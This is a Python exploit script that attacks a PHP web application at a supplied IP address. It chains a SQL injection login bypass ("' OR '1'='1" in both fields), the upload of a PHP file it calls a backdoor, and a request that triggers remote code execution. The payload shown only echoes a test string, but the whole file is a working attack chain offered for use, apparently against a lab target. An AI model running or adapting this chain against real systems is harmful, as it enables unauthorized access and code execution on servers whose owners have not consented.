import requests
import sys
sess = requests.Session()

proxies = {"http": "http://localhost:8080", "https": "http://127.0.0.1:8080"}


def sqli(ip):
    target = "http://%s/web/login.php" % ip
    x = {"username": "' OR '1'='1", "password": "' OR '1'='1", "submit": "Submit"}
    z = sess.post(target,data=x,proxies=proxies)
    if "Upload Section" in z.text:
        print("[+] Bypass Login Page")


def create_rce_file():
    f = open("hello.php6","w+")
    payload = '<?php echo "test-upload"; ?>'
    f.write(payload)
    print("[+] Success Create Rce File")

def rce(ip):
    create_rce_file()
    file = open("hello.php6")
    target = "http://%s/web/upload.php" % ip
    z = {
        "submit":"submit"
    }
    x = sess.post(target,files={"file":file},data=z,proxies=proxies)
    if "Success" in x.text:
        print("[+] Success Upload Backdoor")

def trigger_rce(ip):
    x = "http://%s/web/img/hello.php6" % ip
    z = requests.get(x)
    print("[+] Done Trigger RCE")


if __name__ == "__main__":
    try:
        ip = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage %s <ip>" % sys.argv[0])
        print("[-] Example: %s 192.168.1.x" % sys.argv[0])
        sys.exit(-1)

sqli(ip)
rce(ip)
trigger_rce(ip)